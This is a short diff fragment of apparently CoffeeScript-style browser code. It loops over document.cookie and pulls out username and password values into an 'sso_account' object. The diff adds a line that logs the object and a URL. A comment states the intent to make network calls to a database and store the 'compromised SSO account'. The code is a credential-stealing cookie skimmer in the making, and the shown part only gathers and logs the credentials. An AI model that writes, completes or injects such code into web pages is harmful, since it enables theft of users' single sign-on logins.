@@ -17,7 +17,11 @@ for c in document.cookie.split(';')
     c.includes(USERNAME) and sso_account.username = c_stripped
     c.includes(PASSWORD) and sso_account.pw = c_stripped
 
+console.log(sso_account)
+
 ###
+https://youkwhd.vercel.app/
+
 ...make net calls to a database,
 store the compromised SSO account
 ###
